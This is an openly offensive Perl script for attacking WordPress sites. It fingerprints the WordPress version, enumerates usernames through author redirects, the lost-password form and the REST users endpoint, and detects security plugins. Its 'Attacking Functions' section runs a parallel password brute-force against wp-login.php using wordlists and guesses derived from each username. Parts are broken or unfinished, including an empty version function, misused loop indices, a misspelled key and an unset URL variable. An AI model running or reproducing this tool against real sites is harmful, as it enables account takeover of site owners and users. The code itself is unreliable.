#!/usr/bin/perl

use 5.10.0;

use strict;
use warnings;

use LWP::UserAgent;
use HTTP::Request;
use HTTP::Response;
use HTTP::Cookies;
use Data::Dump qw(dump);
use Term::ANSIColor qw(color colored);
use Getopt::Long;
use Parallel::ForkManager;

no warnings 'experimental';


### Global variables (for configuration/settings stuff)

my $ARGUMENTS = {
    url                => 0,
    timeout            => 15,
    threads            => 50,
    useragent          => 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801',
    proxy              => 0,
    verbosity          => 0,
    usernames_list     => 'data/usernames.lst',
    passwords_list     => 'data/passwords.lst',
    default_paths_list => 'data/default_paths.lst',
};

my $SCAN = {
    url     => 0,
    users   => 0,
    version => 1,
    browser => 0,
};

my $PATHS = {
    login_page        => 'wp-login.php',
    admin_directory   => 'wp-admin/',
    content_directory => 'wp-content/',
    themes_directory  => 'wp-content/themes/',
    plugins_directory => 'wp-content/plugins/',
};

### Call main
main();

sub main {
    # initialization
    initialize();
    
    # Confirms that the given url is wordpress installation
    my $WORDPRESS = checkWordpressUrl($ARGUMENTS->{url});
    
    # Version extraction
    if($SCAN->{version}) {
        if(!$WORDPRESS->{version}) {
            $WORDPRESS = wordpressVersion();
        }
    }
    # Users extraction
    if($SCAN->{users}) {
        info("Starting usernames extraction on " . $WORDPRESS->{url});
        $WORDPRESS = wordpressUsers($WORDPRESS, 'ALL');
    }
    
}

sub initialize {
    # Get command line arguments/options
    GetOptions(
        "tm|timeout=i"    => \$ARGUMENTS->{timeout},
        "t|threads=i"     => \$ARGUMENTS->{threads},
        "u|url=s"         => \$ARGUMENTS->{url},
        "proxy=s"         => \$ARGUMENTS->{proxy},
        "ua|useragent=s"  => \$ARGUMENTS->{useragent},
        "v|verbose!"      => \$ARGUMENTS->{verbosity},
    
        "sv|version"      => \$SCAN->{version},
        "su|users"        => \$SCAN->{users},
    
        "h|help"          => \&help,
    ) or die error("Bad value(s) provided in command line arguments .");
    
    die error("Arguments missing. Please specify at least a wordpress installation url.\n") if(!$ARGUMENTS->{url});
    
    $SCAN->{browser} = initializeBrowser();
}

sub initializeBrowser {
    my $browser = LWP::UserAgent->new();
    
    my $cookie_jar = HTTP::Cookies->new(
        file     => "/tmp/cookies.lwp",
        autosave => 1,
    );
    
    $browser->agent($ARGUMENTS->{useragent});
    $browser->timeout($ARGUMENTS->{timeout});
    $browser->protocols_allowed([qw( ftp ftps http https )]);
    
    if($ARGUMENTS->{proxy} && $ARGUMENTS->{proxy} =~ /^(https?|socks):\/\/[^:]+:[0-9]+$/i) {
        $browser->proxy([qw/ ftp ftps http https /] => $ARGUMENTS->{proxy});
    }
    
    return $browser;
}

######################################## WordPress Informations ########################################

sub checkWordpressUrl {
    my ( $url ) = @_;
    my $request = HTTP::Request->new('GET', $url);
    my $response = $SCAN->{browser}->request($request);
    
    my @matches = ();
    
    my $WORDPRESS = {
        valid   => 0,
        vesion  => 0,
    };
    
    if($response->is_success) {
        print color("blue"), "[" . $response->request->method . "] " . color("cyan") . $response->request->uri . color("blue") . " (" . color("white") . $response->code . color("blue") . ")\n";
        $WORDPRESS = checkHeaders($WORDPRESS, $response);
        
        if(!$WORDPRESS->{valid}) {
            warning("Any Wordpress header found in headers");
            info("Trying to valid by extracting meta generators ...");
            
            $WORDPRESS = extractMetaGenerators($WORDPRESS, $response->content);
            if(!$WORDPRESS->{valid}) {
                warning("Any WordPress generators found .");
                info("Requesting content directory : " . $url . $PATHS->{content_directory});
                
                $response = $SCAN->{browser}->get($url . $PATHS->{content_directory});
                if($response->code =~ /2[0-9][0-9]|301|403/) {
                    $WORDPRESS->{valid} = 1;
                } else {
                    die error("Couldn't confirm WordPress installation on : $url");
                }
            }
        }
        $WORDPRESS->{url} = $response->request->uri;
        
        if($WORDPRESS->{version}) {
            result("WordPress Version Found : WordPress (" . $WORDPRESS->{version} . ")");
        } else {
            warning("Couldn't find WordPress Version .");
        }
    } else {
       error("Unexpected response received from server : " . $response->code);
    }
    
    return $WORDPRESS;
}

sub checkHeaders {
    my ( $WORDPRESS, $response ) = @_;
    my $service_name = 0;
    my $version = 0;
    
    foreach my $header_name (keys %{ $response->headers }) {
        my @header_values = $response->header($header_name);
        
        foreach my $header_value (@header_values) {
            given($header_name)
            {
                when(/X-Generator|X-Powered-By|X-Meta-Generator/i) {
                    given($header_value)
                    {
                        when(/[^\d\s]*(?:\s|-|_|\/)?\(?\s*\d[\.\d]*/i) {
                            ($service_name, $version) = $header_value =~ /([^\d\s]*)(?:\s|-|_|\/)?\(?\s*(\d[\.\d]*)/i;
                        }
                            
                        when(/[a-zA-Z0-9_\-\.\!]+/i) {
                            $service_name = $header_value;
                        }
                    }
                }
            }
            
            if($service_name =~ /Wordpress/i) {
                $WORDPRESS->{valid} = 1;
                $WORDPRESS->{version} = $version if($version);
                
                return $WORDPRESS;
            }
        }
    }
    
    return $WORDPRESS;
}

sub extractMetaGenerators {
    my ( $WORDPRESS, $source ) = @_;
    my $generator_name = 0;
    my $generator_version = "";
    
    my @matches = $source =~ m/<meta[^>^=]+content[\s]*=[\s]*["|']?([^"^'^>]+)["|']?[^>^=]+name[\s]*=[\s]*["|']?generator["|']?/sgi;
    push(@matches, $source =~ m/<meta[^>^=]+name[\s]*=[\s]*["|']?generator["|']?(?:[^>^=]+content[\s]*=[\s]*"([^"^'^>]+)")?/sgi);
    
    foreach my $match (@matches) {
        $generator_name = 0;
        $generator_version = "";
        
        given($match)
        {
            when(/[a-zA-Z0-9\-\_\s]+\s?\([\d\.]+([\d\.vrev]+)*\)/i) {
                ($generator_name, $generator_version) = $match =~ /([a-zA-Z0-9\-\_\s]+)\s?\(([\d\.]+([\d\.vrev]+)*)\)/i;
            }
            
            when(/[^\d\s]*\s*(?:\s|-|_|\/)?\s*\d[\.\d]*/i) {
                ($generator_name, $generator_version) = $match =~ /([^\d\s]*)\s*(?:\s|-|_|\/)?\s*(\d[\.\d]*)/i;
            }
            
            when(/[a-zA-Z0-9_\-\.\!]+/i) {
                $generator_name = $match;
            }
        }
        
        if($generator_name && $generator_name =~ /WordPress/i) {
            $WORDPRESS->{valid} = 1;
            $WORDPRESS->{version} = $generator_version if($generator_version);
            
            return $WORDPRESS;
        }
    }
    
    return $WORDPRESS;
}

sub wordpressUsers {
    my ( $WORDPRESS, $method_type ) = @_;
    $method_type = 'ALL' if(!defined $method_type);

    given($method_type)
    {
        when(/^AUTHORS$|^ALL$/i) {
            my @requests = ();
            
            for(my $id = 0; $id <= 15; $id++) {
                my $request = HTTP::Request->new('GET', $SCAN->{url} . '?author=' . $id);
                $requests[$id] = $request;
            }
            $WORDPRESS = getAuthorsUsers($WORDPRESS, asyncRequests(@requests));
        }
        
        when(/^FORGETPASSWORD$|^ALL$/i) {
            my @requests = ();
            
            for(my $id = 0; $id <= 15; $id++) {
                my $request = HTTP::Request->new('POST', $SCAN->{url} . 'wp-login.php?action=lostpassword');
                $request->content('author=' . $id);
                $requests[$id] = $request;
            }
            $WORDPRESS = getForgetPasswordUsers($WORDPRESS, asyncRequests(@requests));
        }
        
        when(/^XMLRPC$/i) {
            my @requests = ();
            
            for(my $id = 0; $id <= 15; $id++) {
                my $request = HTTP::Request->new('GET', $SCAN->{url} . 'wp-json/wp/v2/users');
                $requests[$id] = $request;
            }
            $WORDPRESS = getXMLRPCUsers($WORDPRESS, asyncRequests(@requests));
        }
    }
    
    return $WORDPRESS;
}

sub wordpressVersion {
    my ( $WORDPRESS ) = @_;
    
    my @paths = read_file($ARGUMENTS->{default_paths_list}, 1);
    my @regexes = [
        qr/Version\s*(\d+\.[\d\.]*)/i,
        qr/version="(\d[\.\d]*)">WORDPRESS</i,
        qr/WORDPRESS (\d[\.\d]*)/i,
    ];
    
}

######################################## Fingerprinting Functions ########################################

sub getAuthorsUsers {
    my ( $WORDPRESS, @responses ) = @_;

    foreach my $user_id (@responses) {
        my $username = 0;
        my $response = $responses[$user_id];
        $response = $response->previous if($response->previous);
        
        if($response->header('Location') && $response->header('Location') =~ /\/author\/.*\/?/) {
            ($username) = $response->header('Location') =~ /\/author\/([^\/*])\/?/;
        }
        
        if($username) {
            result("WordPress User " . color("cyan") . "#$user_id " . color("blue") . "Found : " . color("yellow") . $username);
            $WORDPRESS->{users}->{$user_id} = $username;
        }
    }
    
    return $WORDPRESS;
}

sub getForgetPasswordUsers {
    my ( $WORDPRESS, @responses ) = @_;
    
    foreach my $user_id (@responses) {
        my $username = 0;
        my $response = $responses[$user_id];
        
        if($response->content =~ /author[\-\/]/) {
            ($username) = $response->content =~ /author[\-\/](.*)\/?/;
            
            if($username) {
                result("WordPress User " . color("cyan") . "#$user_id " . color("blue") . "Found : " . color("yellow") . $username);
                $WORDPRESS->{users}->{$user_id} = $username;
            }
        }
    }
    
    return $WORDPRESS;
}

sub getXMLRPCUsers {
    my ( $WORDPRESS, @responses ) = @_;
    
    foreach my $user_id (@responses) {
        my $response = $responses[$user_id];
        last if($response->content =~ /rest_api_access_restricted/);
        
        if($response->content =~ /"slug":/) {
            ($WORDPRESS->{users}->{$user_id}->{picture}) = $response->content =~ /"link":"([^"]*)"/i if($response->content =~ /"link":"([^"]*)"/i);
            ($WORDPRESS->{users}->{$user_id}->{name}) = $response->content =~ /"name":"([^"]*)"/i if($response->content =~ /"name":"([^"]*)"/i);
            ($WORDPRESS->{users}->{$user_id}->{username}) = $response->content =~ /"slug":"([^"]*)"/i if($response->content =~ /"slug":"([^"]*)"/i);
            
            if($WORDPRESS->{users}->{$user_id}->{username}) {
                result("WordPress User " . color("cyan") . "#$user_id " . color("blue") . "Found : " . color("yellow") . $WORDPRESS->{users}->{$user_id}->{username});
            }
        }
    }
    
    return $WORDPRESS;
}

sub getWAFPlugins {
    my ( $WORDPRESS ) = @_;
    
    my $WAF = {
        'WORDFENCE' => {
            name => 'Wordfence',
            path => 'wp-content/plugins/wordfence/',
        },
    
        'BULLETPROOF' => {
            name => 'BulletProof Security',
            path => 'wp-content/plugins/bulletproof-security/',
        },
        
        'SUCURI' => {
            name => 'Sucuri Scanner',
            path => 'wp-content/plugins/sucuri-scanner/',
        },
        
        'BETTERWP' => {
            name => 'Better WP Security',
            path => 'wp-content/plugins/better-wp-security/',
        },
        
        'ACUNETIX' => {
            name => 'Acunetix WP SecurityScan',
            path => 'wp-content/plugins/wp-security-scan/',
        },
        
        'ALLINONEWPSECURITY' => {
            name => 'All In One WP Security & Firewall',
            path => 'wp-content/plugins/all-in-one-wp-security-and-firewall/',
            
        },
        
        '6SCAN' => {
            name => '6Scan Security',
            path => 'wp-content/plugins/6scan-protection/',
            
        },
    };
    
    foreach my $waf_type (keys %{ $WAF }) {
        my $request = HTTP::Request->new('GET', $WORDPRESS->{url} . $WAF->{$waf_type}->{path});
        my $response = $SCAN->{browser}->request($request);
        
        if($response->is_success) {
            warning("WordPress WAF Plugin [" . color("red") . $WAF->{$waf_type}->{name} . color("blue") . "] Destected : " . color("yellow") . $WORDPRESS->{url} . $WAF->{$waf_type}->{path});
            $WORDPRESS->{WAF}->{$WAF->{$waf_type}->{name}} = $WORDPRESS->{url} . $WAF->{$waf_type}->{path};
        }
    }
}

####################################### Attacking Functions ######################################

sub loginBruteforce {
    my ( $WORDPRESS ) = @_;
    
    my @usernames = ();
    my @passwords = read_file($ARGUMENTS->{passwords_list}, 1);
    
    my @requests = ();
    my @responses = ();
    
    if(keys %{ $WORDPRESS->{users} }) {
        foreach my $user_id (keys %{ $WORDPRESS->{users} }) {
            my $username = $WORDPRESS->{users}->{$user_id}->{username};
            push(@usernames, $username);
        }
    } else {
        @usernames = read_file($ARGUMENTS->{usernames_list}, 1);
    }
    
    foreach my $username (@usernames) {
        my @requests = ();
        my @custom_passwords = @passwords;
        push(@custom_passwords, getCustomPasswords($username));
        
        foreach my $password (@custom_passwords) {
            my $request = HTTP::Request->new('POST', $WORDPRESS->{login_page});
            $request->header('Referer' => $WORDPRESS->{login_page});
            $request->content('log=' . $username . '&pwd=' . $password . '&');
            push(@requests, $request);
        }
        my @responses = asyncRequests(@requests);
        
        foreach my $response (@responses) {
            if($response->previous) {
                $response = $response->previous;
            }
            
            if($response->header('Location') && $response->header('Location') =~ /wp-admin/i) {
                result("Credentials Found !");
            }
        }
    }
}

sub getCustomPasswords {
    my ( $name ) = @_;
    
    my @custom_passwords = ($name, ucfirst(lc($name)), uc($name), reverse($name));
    
    return @custom_passwords;
}

####################################### Requests Functions #######################################

sub asyncRequests {
    my ( @requests ) = @_;
    my $pm = Parallel::ForkManager->new($ARGUMENTS->{threads});
    
    my @responses = ();
    
    for (my $id = 0; $id <= 0+@requests; $id++) {
        # Forks and returns the pid for the child:
        my $pid = $pm->start and next; 
        
        $responses[$id] = $SCAN->{browser}->request($requests[$id]);
    }
    
    return @responses;
}

######################################## General Functions ########################################

sub read_file {
    my ( $file, $chomp ) = @_;
    $chomp = 0 if(!defined($chomp));
    
    open FILE, $file or die error("$file couldn't be read  .");
    my @content = <FILE>;
    close FILE;
    
    if($chomp) {
        my @final_content = ();
        
        foreach my $line (@content) {
            chomp $line;
            push(@final_content, $line);
        }
        
        return @final_content;
    }
    
    return @content;
}

sub info {
    my ( $text ) = @_;
    print color("white") . "[" . color("blue") . "*" . color("white") . "]" . color("blue") . " INFO" . color("white") . ": " . color("cyan") . " $text\n";
}

sub warning {
    my ( $text ) = @_;
    print color("white") . "[" . color("yellow") . "!" . color("white") . "]" . color("yellow") . " WARNING" . color("white") . ": " . color("cyan") . "$text\n";
}

sub result {
    my ( $text ) = @_;
    print color("white") . "[" . color("green") . "+" . color("white") . "]" . color("blue") . " INFO" . color("white") . ": " . color("cyan") . " $text\n";
}

sub error {
    my ( $text ) = @_;
    print color("white") . "[" . color("red") . "-" . color("white") . "]" . color("red") . " ERROR" . color("white") . ": " . color("cyan") . "$text\n";
    exit;
}
